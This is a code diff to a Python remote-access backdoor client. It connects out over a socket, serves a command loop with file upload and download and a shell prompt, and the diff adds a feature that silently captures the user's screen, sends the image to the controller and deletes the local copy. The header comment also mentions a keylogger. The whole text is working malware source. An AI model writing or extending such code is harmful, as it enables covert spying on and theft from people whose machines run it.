@@ -1,8 +1,16 @@
-#To add the feature of KeyLogger
+#To add the feature of Screenshots
 import socket
 import os
+import pyautogui
 import re
 import subprocess
+
+def screenshots(s):
+    ss = pyautogui.screenshot()
+    ss.save("ss.png")
+    transfer(s, "ss.png")
+    subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
 
 def transfer(s, filename):
     f = open(filename,"rb")
@@ -24,7 +32,6 @@ def get(s, filename):
             break
         f.write(bits)
     f.close()
-
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1234
@@ -58,6 +65,9 @@ while True:
         continue
     elif 'upload*' in res:
         get(s, res.split("*")[2])
+        continue
+    elif res == 'ss':
+        screenshots(s)
         continue
     else:
         s.send((os.getcwd() + ">").encode())
